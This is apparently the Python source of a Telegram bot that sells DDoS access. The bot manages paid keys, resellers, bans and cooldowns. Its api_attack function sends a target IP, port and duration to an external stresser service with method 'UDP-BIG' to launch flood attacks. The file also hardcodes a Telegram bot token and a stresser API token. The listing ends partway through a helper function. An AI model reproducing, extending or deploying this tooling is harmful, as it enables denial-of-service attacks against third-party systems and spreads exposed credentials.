#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝖊𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙸𝚇˼ ♪
Owner: 1987818347
PREMIUM FULL FIXED - All Media Working
"""

import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove
import threading
import os
import re
import sys
import json
import random
import string
import unicodedata
import uuid
from datetime import datetime, timedelta, timezone
import time
import math
import requests
import traceback

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAFLRZxsbYZjHBOitQo4f_2ZwUvXDBXZOJA")
BOT_OWNER = int(os.environ.get('BOT_OWNER', 1987818347))
BOT_OWNER_STR = str(BOT_OWNER)

BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝖊𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙸𝚇˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "a05d4ed492744534ab9307b8d9930c2f6a3a8ffa6eea85d07825ec150215747a"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"
FEEDBACK_FILE = "feedback_data.json"

DEV_BUTTON_TEXT = "˹ᴅᴇᴠᴇʟᴏᴩᴇʀ˼ 🪽 ➪ 𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞"
DEVELOPER_USERNAME = "BeStChEaT_OwNeR"

# ============= RUNTIME SETTINGS =============
UPDATE_INTERVAL = 5
AUTO_STOP_AFTER = 120

# ============= IST TIMEZONE =============
IST = timezone(timedelta(hours=5, minutes=30))

def ist_now():
    return datetime.now(IST).replace(tzinfo=None)

BOT_START_TIME = ist_now()

def to_ist(dt):
    if dt is None: return ist_now()
    if isinstance(dt, str):
        try: dt = datetime.fromisoformat(dt)
        except: return ist_now()
    if dt.tzinfo is None: return dt
    return dt.astimezone(IST).replace(tzinfo=None)

def dev_btn_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton(DEV_BUTTON_TEXT, url=f"https://t.me/{DEVELOPER_USERNAME}"))
    return kb

HEALTH = {
    "total_messages": 0, "total_commands": 0, "total_errors": 0,
    "total_attacks": 0, "api_success": 0, "api_failed": 0,
    "last_api_ping_ms": 0, "api_status": "🟡 UɴKɴᴏWɴ",
    "start_time": BOT_START_TIME
}

# ============= REACTION SYSTEM ★★★ =============
REACTION_EMOJIS = [
    "👍", "🔥", "❤️", "😍", "🎉", "⚡", "💯", "👏", "🚀", "😎",
    "🥰", "😘", "🤩", "💥", "✨", "🌟", "⭐", "🎯", "🏆", "🥇",
    "💪", "🙌", "👊", "✌️", "🤝", "💐", "🌹", "🍀", "🌈", "☀️",
    "🥳", "😻", "🤗", "🥲", "😇", "🤠", "👑", "💎", "🎁", "🎊",
    "🥂", "🍾", "🎈", "🎂", "🍭", "🍬", "🧁", "🍕", "🍔", "🍟",
    "🦄", "🐯", "🦁", "🐸", "🐼", "🐨", "🐵", "🦊", "🐺", "🦅"
]

def send_reaction(chat_id, message_id, emoji=None):
    try:
        if emoji is None:
            emoji = random.choice(REACTION_EMOJIS)
        
        # ★ Small delay to avoid Telegram rate limit ★
        time.sleep(0.3)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setMessageReaction"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "reaction": [{"type": "emoji", "emoji": emoji}],
            "is_big": False
        }
        r = requests.post(url, json=payload, timeout=5)
        if r.status_code == 200:
            print(f"✅ REACTION SENT: {emoji}")
        else:
            print(f"⚠️ REACTION FAILED: HTTP {r.status_code} | {r.text[:100]}")
        return r.status_code == 200
    except Exception as e:
        print(f"❌ Reaction error: {e}")
        return False

# ═══════════════════════════════════════════════════════════
# ★★★ REACTION HELPER — HAR HANDLER MEIN USE HOGA ★★★
# ═══════════════════════════════════════════════════════════
_last_reaction_idx = [0]

def get_next_reaction_emoji():
    global _last_reaction_idx
    _last_reaction_idx[0] = (_last_reaction_idx[0] + 1) % len(REACTION_EMOJIS)
    return REACTION_EMOJIS[_last_reaction_idx[0]]

def react_to_message(msg):
    """Har handler ke pehli line mein call karo — reaction bhejega."""
    try:
        if not msg.from_user: return
        try:
            if msg.from_user.id == bot.get_me().id: return
        except: pass
        if is_banned(msg.from_user.id): return
        emoji = get_next_reaction_emoji()
        print(f"🎯 REACTION: msg_id={msg.message_id} | emoji={emoji}")
        threading.Thread(
            target=send_reaction,
            args=(msg.chat.id, msg.message_id, emoji),
            daemon=True
        ).start()
    except Exception as e:
        print(f"❌ react_to_message error: {e}")
        
# ============= SAFE HELPERS =============
def safe_parse_dt(val):
    if isinstance(val, datetime): return val
    if isinstance(val, str):
        try: return datetime.fromisoformat(val)
        except: return None
    return None

def safe_int(val, default=0):
    try: return int(val)
    except: return default

def ensure_dict(obj):
    return obj if isinstance(obj, dict) else {}

def ensure_list(obj):
    return obj if isinstance(obj, list) else []

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {BOT_OWNER_STR: {"added_at": ist_now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [], "videos": [], "pyf_videos": [],
        "feedback_required": {},
        "feedback_enabled": False,
        "pending_attacks": {},
        "settings": {
            "max_attack_time": 300, "user_cooldown": 5,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL, "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD, "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    for key in ["users", "keys", "resellers", "admins", "banned_users", "feedback_required", "pending_attacks"]:
                        if not isinstance(d.get(key), dict): d[key] = {}
                    for key in ["attack_logs", "admin_logs", "stickers", "videos", "pyf_videos", "feedbacks"]:
                        if not isinstance(d.get(key), list): d[key] = []
                    if not isinstance(d.get("settings"), dict):
                        d["settings"] = default["settings"]
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    if not d["settings"].get("api_token") or len(str(d["settings"].get("api_token", ""))) < 10:
                        d["settings"]["api_token"] = DEFAULT_API_TOKEN
                    if not d["settings"].get("api_url") or not str(d["settings"].get("api_url", "")).startswith("http"):
                        d["settings"]["api_url"] = DEFAULT_API_URL
                    if not d["settings"].get("api_method"):
                        d["settings"]["api_method"] = DEFAULT_API_METHOD
                    if not d["settings"].get("api_geolocation"):
                        d["settings"]["api_geolocation"] = DEFAULT_API_GEOLOCATION
                    if BOT_OWNER_STR not in d["admins"]:
                        d["admins"][BOT_OWNER_STR] = {"added_at": ist_now().isoformat()}
                    return d
        except Exception as e:
            print(f"⚠️ Load data error: {e}")
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except Exception as e:
        print(f"⚠️ Save data error: {e}")

data = load_data()
save_data(data)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ============= FEEDBACK DB =============
def load_feedback_db():
    if os.path.exists(FEEDBACK_FILE):
        try:
            with open(FEEDBACK_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict): return d
        except: pass
    return {"feedbacks": {}, "image_hashes": {}}

def save_feedback_db(d):
    try:
        with open(FEEDBACK_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except Exception as e:
        print(f"⚠️ Save feedback error: {e}")

feedback_db = load_feedback_db()

def generate_feedback_id():
    return "FB-" + uuid.uuid4().hex[:10].upper()

# ============= ★★★ FIXED ROTATION SYSTEM ★★★ =============
_sticker_pool = []
_video_pool = []

def get_random_sticker():
    """Get random sticker with proper rotation."""
    global _sticker_pool
    stickers = ensure_list(data.get("stickers", []))
    if not stickers:
        print("⚠️ Nᴏ Sᴛɪᴄᴋᴇʀs Iɴ Dᴀᴛᴀʙᴀsᴇ")
        return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy()
        random.shuffle(_sticker_pool)
        print(f"🔄 Sᴛɪᴄᴋᴇʀ ᴘᴏᴏʟ ʀᴇғɪʟʟᴇᴅ ({len(_sticker_pool)} ɪᴛᴇᴍs)")
    try:
        chosen = _sticker_pool.pop()
        print(f"✅ Sᴇʟᴇᴄᴛᴇᴅ sᴛɪᴄᴋᴇʀ ➪ {chosen[:30]}...")
        return chosen
    except Exception as e:
        print(f"❌ Sticker pop error ➪ {e}")
        return None

def get_random_video():
    """Get random video with proper rotation."""
    global _video_pool
    videos = ensure_list(data.get("videos", []))
    if not videos:
        print("⚠️ Nᴏ ᴠɪᴅᴇᴏs ɪɴ ᴅᴀᴛᴀʙᴀsᴇ")
        return None
    if not _video_pool:
        _video_pool = videos.copy()
        random.shuffle(_video_pool)
        print(f"🔄 Vɪᴅᴇᴏ ᴘᴏᴏʟ ʀᴇғɪʟʟᴇᴅ ({len(_video_pool)} ɪᴛᴇᴍs)")
    try:
        chosen = _video_pool.pop()
        print(f"✅ Sᴇʟᴇᴄᴛᴇᴅ ᴠɪᴅᴇᴏ ➪ {chosen[:30]}...")
        return chosen
    except Exception as e:
        print(f"❌ Video pop error ➪ {e}")
        return None

# ★ GLOBAL PYF rotation — sab users ke liye common
_pyf_global_index = [0]

def get_random_pyf(user_id=None):
    """Get PYF video with GLOBAL rotation — same video dobara nahi jab tak sab cover na ho."""
    pyfs = ensure_list(data.get("pyf_videos", []))
    if not pyfs:
        print("⚠️ Nᴏ PYF ᴠɪᴅᴇᴏs ɪɴ ᴅᴀᴛᴀʙᴀsᴇ")
        return None

    # GLOBAL rotation — har user ko alag video milegi
    idx = _pyf_global_index[0] % len(pyfs)
    chosen = pyfs[idx]
    _pyf_global_index[0] = (idx + 1) % len(pyfs)

    print(f"✅ PYF (global): index={idx}/{len(pyfs)-1} → {chosen[:30]}...")
    return chosen

# ============= HELPERS =============
def is_owner(uid):
    try:
        uid_int = int(uid)
        if uid_int == BOT_OWNER:
            return True
        return str(uid_int) in ensure_dict(data.get("admins", {}))
    except Exception as e:
        print(f"is_owner error: {e}")
        return False

def is_reseller(uid):
    try:
        r = ensure_dict(data.get("resellers", {})).get(str(uid))
        return r is not None and not r.get('blocked', False)
    except: return False

def is_banned(uid):
    try: return str(uid) in ensure_dict(data.get("banned_users", {}))
    except: return False

def get_setting(k, d=None):
    try: return ensure_dict(data.get("settings", {})).get(k, d)
    except: return d

def set_setting(k, v):
    try:
        if not isinstance(data.get("settings"), dict): data["settings"] = {}
        data["settings"][k] = v; save_data(data)
    except Exception as e:
        print(f"set_setting error: {e}")

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    try:
        if is_owner(uid) or is_reseller(uid): return True
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'): return False
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return False
        return ist_now() <= exp
    except: return False

def key_state(uid):
    try:
        if is_owner(uid): return "owner"
        if is_reseller(uid): return "reseller"
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'): return "none"
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return "none"
        if ist_now() <= exp: return "active"
        return "expired"
    except: return "none"

def ist_time_str(dt=None):
    try:
        if dt is None: dt = ist_now()
        if isinstance(dt, str):
            dt = safe_parse_dt(dt)
            if not dt: dt = ist_now()
        return to_ist(dt).strftime('%I:%M:%S %p')
    except: return "N/A"

def ist_full_str(dt=None):
    try:
        if dt is None: dt = ist_now()
        if isinstance(dt, str):
            dt = safe_parse_dt(dt)
            if not dt: dt = ist_now()
        return to_ist(dt).strftime('%d %b %Y, %I:%M:%S %p')
    except: return "N/A"

def time_remaining(uid):
    if is_owner(uid): return "🌼 ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "🚇 ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    try:
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'): return "🎟️ ɴᴏ ᴋᴇʏ"
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return "🧿 ɴᴏ ᴋᴇʏ"
        rem = exp - ist_now()
        total = int(rem.total_seconds())
        if total <= 0: return "📟 ᴇxᴘɪʀᴇᴅ"
        d = total // 86400; h = (total % 86400) // 3600
        m = (total % 3600) // 60; s = total % 60
        parts = []
        if d > 0: parts.append(f"{d}ᴅ")
        if h > 0: parts.append(f"{h}ʜ")
        if m > 0: parts.append(f"{m}ᴍ")
        parts.append(f"{s}ꜱ")
        return " ".join(parts)
    except: return "📮 ᴇʀʀᴏʀ"

def time_remaining_lines(uid):
    if is_owner(uid): return "  ┗ ☣️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "  ┗ 🍇 ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    try:
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'):
            return "  ┗ 🔬 ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return "  ┗ 🧩 ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
        rem = exp - ist_now()
        total = int(rem.total_seconds())
        if total <= 0: return "  ┗ 🧟 ᴇxᴘɪʀᴇᴅ"
        d = total // 86400; h = (total % 86400) // 3600
        m = (total % 3600) // 60; s = total % 60
        lines = []
        if d > 0: lines.append(f"  ┣ 📅 ᴅᴀʏꜱ ➪ <b>{d:02d}</b>")
        if h > 0: lines.append(f"  ┣ 🕐 ʜᴏᴜʀꜱ ➪ <b>{h:02d}</b>")
        if m > 0: lines.append(f"  ┣ ⏱️ ᴍɪɴᴜᴛᴇꜱ ➪ <b>{m:02d}</b>")
        lines.append(f"  ┗ ⚡ ꜱᴇᴄᴏɴᴅꜱ ➪ <b>{s:02d}</b>")
        return "\n".join(lines)
    except: return "  ┗ 🪫 ᴇʀʀᴏʀ"

def escape_html(text):
    if text is None: return "N/A"
    try:
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    except: return "N/A"

def safe_reply(msg, text, **kwargs):
    try:
        return bot.reply_to(msg, text, **kwargs)
    except Exception as e:
        print(f"❌ reply_to failed: {str(e)[:120]}")
        try:
            return bot.send_message(msg.chat.id, text, **kwargs)
        except Exception as e2:
            print(f"❌ send_message also failed: {str(e2)[:120]}")
            return None

def safe_send(cid, text, **kwargs):
    try: return bot.send_message(cid, text, **kwargs)
    except Exception as e:
        print(f"❌ Safe send error: {str(e)[:120]}"); return None

# ============= BUTTON MATCHING =============
def normalize_text(text):
    if not text: return ""
    try:
        # Remove zero-width and control characters
        for ch in ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00a0',
                   '\u2028', '\u2029', '\u2060', '\u180e']:
            text = text.replace(ch, '')
        
        # Normalize unicode (handles bold/italic math letters)
        text = unicodedata.normalize('NFKD', text)
        
        # Remove combining marks
        text = ''.join(c for c in text if not unicodedata.combining(c))
        
        # ★★★ ADD THIS: Convert math bold/italic letters to normal ★★★
        # Map Mathematical Alphanumeric Symbols to normal A-Z0-9
        result = []
        for c in text:
            cp = ord(c)
            # Mathematical Bold Capital A-Z (U+1D400 - U+1D419)
            if 0x1D400 <= cp <= 0x1D419:
                result.append(chr(ord('A') + (cp - 0x1D400)))
            # Mathematical Bold Small a-z (U+1D41A - U+1D433)
            elif 0x1D41A <= cp <= 0x1D433:
                result.append(chr(ord('a') + (cp - 0x1D41A)))
            # Mathematical Bold Digits 0-9 (U+1D7CE - U+1D7D7)
            elif 0x1D7CE <= cp <= 0x1D7D7:
                result.append(chr(ord('0') + (cp - 0x1D7CE)))
            # Mathematical Italic Capital A-Z (U+1D434 - U+1D44D)
            elif 0x1D434 <= cp <= 0x1D44D:
                result.append(chr(ord('A') + (cp - 0x1D434)))
            # Mathematical Italic Small a-z (U+1D44E - U+1D467)
            elif 0x1D44E <= cp <= 0x1D467:
                result.append(chr(ord('a') + (cp - 0x1D44E)))
            # Mathematical Sans-Serif Bold Capital (U+1D5D4 - U+1D5ED)
            elif 0x1D5D4 <= cp <= 0x1D5ED:
                result.append(chr(ord('A') + (cp - 0x1D5D4)))
            # Mathematical Sans-Serif Bold Small (U+1D5EE - U+1D607)
            elif 0x1D5EE <= cp <= 0x1D607:
                result.append(chr(ord('a') + (cp - 0x1D5EE)))
            else:
                result.append(c)
        
        return ''.join(result).strip().upper()
    except Exception as e:
        print(f"normalize_text error: {e}")
        return text.strip().upper() if text else ""

def get_button_type(text):
    try:
        if not text: return None
        stripped = text.strip()
        if stripped.startswith('/'): return None

        t = normalize_text(text)
        if not t: return None
        t_clean = re.sub(r'[^A-Z0-9]', '', t)

        def has(*kws):
            return all(k in t_clean for k in kws)

        if has("OWNER", "PANEL"): return "OWNER_PANEL"
        if has("GEN", "KEY"): return "GEN_KEY"
        if "BROADCAST" in t_clean: return "BROADCAST"
        if "SETTINGS" in t_clean: return "SETTINGS"
        if "PROFILE" in t_clean: return "PROFILE"
        if "STATUS" in t_clean: return "STATUS"
        if "STATS" in t_clean: return "STATS"
        if "USERS" in t_clean: return "USERS"
        if "ATTACK" in t_clean and "STATS" not in t_clean: return "ATTACK"
        if "REDEEM" in t_clean: return "REDEEM"
        if "CLOSE" in t_clean: return "CLOSE"
        return None
    except Exception as e:
        print(f"get_button_type error: {e}")
        return None

# ============= HEALTH MONITOR =============
def api_health_check():
    while True:
        try:
            time.sleep(30)
            url = get_setting("api_url", DEFAULT_API_URL)
            token = get_setting("api_token", DEFAULT_API_TOKEN)
            start = time.time()
            try:
                r = requests.get(url, params={"token": token}, timeout=15)
                elapsed_ms = int((time.time() - start) * 1000)
                HEALTH["last_api_ping_ms"] = elapsed_ms
                if r.status_code in [200, 400, 401, 403, 405]:
                    HEALTH["api_status"] = "🟢 ᴏɴʟɪɴᴇ"
                else:
                    HEALTH["api_status"] = f"🟡 HTTP {r.status_code}"
            except requests.exceptions.Timeout:
                HEALTH["last_api_ping_ms"] = int((time.time() - start) * 1000)
                HEALTH["api_status"] = "🟠 ᴛɪᴍᴇᴏᴜᴛ"
            except Exception:
                HEALTH["last_api_ping_ms"] = int((time.time() - start) * 1000)
                HEALTH["api_status"] = "🔴 ᴏꜰꜰʟɪɴᴇ"
        except Exception as e:
            print(f"Health check error: {e}")

threading.Thread(target=api_health_check, daemon=True).start()

# ============= BAN CHECK =============
def check_ban(msg):
    try:
        uid = msg.from_user.id
        if is_banned(uid):
            ban_info = ensure_dict(data.get("banned_users", {})).get(str(uid), {})
            if isinstance(ban_info, dict):
                reason = ban_info.get("reason", "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ")
                banned_at = ban_info.get("banned_at", "N/A")
                dt = safe_parse_dt(banned_at)
                if dt:
                    banned_at = (dt + timedelta(hours=5, minutes=30)).strftime("%d %b %Y %I:%M:%S %p")
                else:
                    banned_at = "N/A"
            else:
                reason = "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ"; banned_at = "N/A"

            ban_msg = (
                "╔══════════════════════════╗\n"
                "║    ✦ ━━━━━━━━━━━━━━━━━━━━ ✦   ║\n"
                "║             🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 ⛔             ║\n"
                "║    ✦ ━━━━━━━━━━━━━━━━━━━━ ✦   ║\n"
                "╚══════════════════════════╝\n\n"
                "╭──────────────────────╮\n"
                "│         🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗 ⛔     │\n"
                "╰──────────────────────╯\n\n"
                "🔒 <b>ᴀᴀᴘᴋᴏ ɪꜱ ʙᴏᴛ ꜱᴇ ʙᴀɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"◆ 🆔 ʏᴏᴜʀ ɪᴅ ➪ <code>{uid}</code>\n"
                f"◆ 📅 ʙᴀɴɴᴇᴅ ᴀᴛ ➪ <code>{banned_at} IST</code>\n"
                f"◆ 📝 ʀᴇᴀꜱᴏɴ ➪ <i>{escape_html(reason)}</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "⚠️ <b>ᴀᴀᴘ ʙᴏᴛ ᴋᴀ ᴋᴏɪ ʙʜɪ ꜰᴇᴀᴛᴜʀᴇ ᴜꜱᴇ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                "💬 <b>ᴜɴʙᴀɴ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ</b>\n"
                f"👑 <b>ᴏᴡɴᴇʀ ɪᴅ:</b> <code>{BOT_OWNER}</code>\n\n"
                "╔══════════════════════════╗\n"
                "║              🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 🔒        ║\n"
                "╚══════════════════════════╝"
            )
            bot.reply_to(msg, ban_msg, parse_mode="HTML", reply_markup=dev_btn_kb())
            return True
    except Exception as e:
        print(f"check_ban error: {e}")
    return False

# ============= API =============
def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)

        if not url or not str(url).startswith("http"):
            url = DEFAULT_API_URL
            set_setting("api_url", url)
        if not token or len(str(token)) < 10:
            token = DEFAULT_API_TOKEN
            set_setting("api_token", token)
        if not method:
            method = DEFAULT_API_METHOD
            set_setting("api_method", method)
        if not geo:
            geo = DEFAULT_API_GEOLOCATION
            set_setting("api_geolocation", geo)

        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        start = time.time()
        resp = requests.get(req, timeout=15)
        elapsed_ms = int((time.time() - start) * 1000)
        HEALTH["last_api_ping_ms"] = elapsed_ms
        if resp.status_code == 200:
            HEALTH["api_success"] += 1
            return True, resp.text
        HEALTH["api_failed"] += 1
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        HEALTH["api_failed"] += 1
        return False, str(e)

# ============= KEYBOARDS =============
def kb_main(uid):
    if is_owner(uid):
        m = ReplyKeyboardMarkup(resize_keyboard=True)
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄", "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
        return m
    elif is_reseller(uid) or has_valid_key(uid):
        m = ReplyKeyboardMarkup(resize_keyboard=True)
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
        return m
    else:
        # ★★★ NO KEY — Remove all buttons ★★★
        return ReplyKeyboardRemove()

def kb_owner():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("🔑 𝐆𝐄𝐍 𝐊𝐄𝐘", "👥 𝐔𝐒𝐄𝐑𝐒")
    m.row("📊 𝐒𝐓𝐀𝐓𝐒", "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
    m.row("⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", "❌ 𝐂𝐋𝐎𝐒𝐄")
    return m

# ============= KEY EXPIRY NOTIFIER =============
_expiry_notified = {}

def check_key_expiry_notifications():
    while True:
        try:
            time.sleep(15)
            now = ist_now()
            for uid_str, u in list(ensure_dict(data.get("users", {})).items()):
                if not isinstance(u, dict): continue
                if not u.get('key_expiry'): continue
                try:
                    expiry = safe_parse_dt(u['key_expiry'])
                    if not expiry: continue
                    if expiry <= now and (now - expiry).total_seconds() < 120:
                        if uid_str not in _expiry_notified:
                            _expiry_notified[uid_str] = True
                            try:
                                expire_msg = (
                                    "╔══════════════════════════╗\n"
                                    "║                 ⏰ 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⏰                ║\n"
                                    "╚══════════════════════════╝\n\n"
                                    "╭──────────────────────╮\n"
                                    "│                💔 𝗧𝗜𝗠𝗘 𝗨𝗣 💔                │\n"
                                    "╰──────────────────────╯\n\n"
                                    "🔒 <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
                                    f"◆ 📅 ᴇxᴘɪʀᴇᴅ ➪ <code>{ist_full_str(expiry)} IST</code>\n"
                                    f"◆ 🕐 ᴄᴜʀʀᴇɴᴛ ➪ <code>{ist_full_str(now)} IST</code>\n\n"
                                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                    "⚠️ <b>ᴀᴀᴘ ᴀʙ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                                    "📌 <b>ɴᴀʏᴀ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                                    "➤ <code>/redeem YOUR-KEY</code>\n\n"
                                    f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{BOT_OWNER}</code>\n\n"
                                    "╔══════════════════════════╗\n"
                                    "║                  🔥 ɢᴇᴛ ɴᴇᴡ ᴋᴇʏ 🍑                   ║\n"
                                    "╚══════════════════════════╝"
                                )
                                # STEP 1: Keyboard remove karne ke liye chhota message
                                bot.send_message(int(uid_str), "🔒 ᴋᴇʏ ᴇxᴘɪʀᴇᴅ — ᴋᴇʏʙᴏᴀʀᴅ ʀᴇᴍᴏᴠᴇᴅ", reply_markup=ReplyKeyboardRemove())

                                # STEP 2: Expire message
                                bot.send_message(int(uid_str), expire_msg, parse_mode="HTML")
                                print(f"🔒 Key expired for {uid_str} — Keyboard removed")
                            except Exception as e:
                                print(f"Expiry notify error {uid_str}: {e}")
                except: pass
        except Exception as e:
            print(f"Expiry check error: {e}")

threading.Thread(target=check_key_expiry_notifications, daemon=True).start()

# ============= ACTIVE ATTACKS & COOLDOWN =============
user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}
_stop_flags = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0:
            return int(math.ceil(r))
        else:
            del user_cooldown[uid]
            return 0
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 5)
    if cd > 0:
        user_cooldown[uid] = time.time() + cd + 0.5
        print(f"⏱️ Cooldown set for {uid}: {cd}s")

def is_attack_running(uid=None):
    with attack_lock:
        now = ist_now()
        for aid, atk in list(active_attacks.items()):
            if atk['end_time'] <= now: del active_attacks[aid]
        if uid is None:
            return len(active_attacks) > 0
        return any(a.get('user_id') == uid for a in active_attacks.values())

# ============================================================
# ★★★ RATE LIMITER ★★★
# ============================================================
_edit_lock = threading.Lock()
_last_edit_time = [0.0]
MIN_EDIT_INTERVAL = 2.5

def _wait_for_rate_limit():
    with _edit_lock:
        now = time.time()
        diff = now - _last_edit_time[0]
        if diff < MIN_EDIT_INTERVAL:
            time.sleep(MIN_EDIT_INTERVAL - diff)
        _last_edit_time[0] = time.time()

def _handle_flood_error(e):
    err_str = str(e)
    m = re.search(r'retry after (\d+)', err_str, re.IGNORECASE)
    if m:
        wait = int(m.group(1))
        print(f"⚠️ Flood wait: {wait}s")
        time.sleep(wait + 1)
        return True
    return False

def safe_edit_text(cid, mid, text, **kwargs):
    _wait_for_rate_limit()
    try:
        return bot.edit_message_text(chat_id=cid, message_id=mid, text=text, **kwargs)
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" in err:
            return "NOT_MODIFIED"
        if "too many requests" in err or "retry after" in err:
            _handle_flood_error(e)
            try:
                return bot.edit_message_text(chat_id=cid, message_id=mid, text=text, **kwargs)
            except: return None
        if "there is no text in the message to edit" in err or "message can't be edited" in err:
            try:
                return bot.edit_message_caption(chat_id=cid, message_id=mid, caption=text, **kwargs)
            except: return None
        print(f"edit_text err: {str(e)[:120]}")
        return None

def safe_edit_caption(cid, mid, caption, **kwargs):
    _wait_for_rate_limit()
    try:
        return bot.edit_message_caption(chat_id=cid, message_id=mid, caption=caption, **kwargs)
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" in err:
            return "NOT_MODIFIED"
        if "too many requests" in err or "retry after" in err:
            _handle_flood_error(e)
            try:
                return bot.edit_message_caption(chat_id=cid, message_id=mid, caption=caption, **kwargs)
            except: return None
        if "there is no caption in the message to edit" in err or "message can't be edited" in err:
            try:
                return bot.edit_message_text(chat_id=cid, message_id=mid, text=caption, **kwargs)
            except: return None
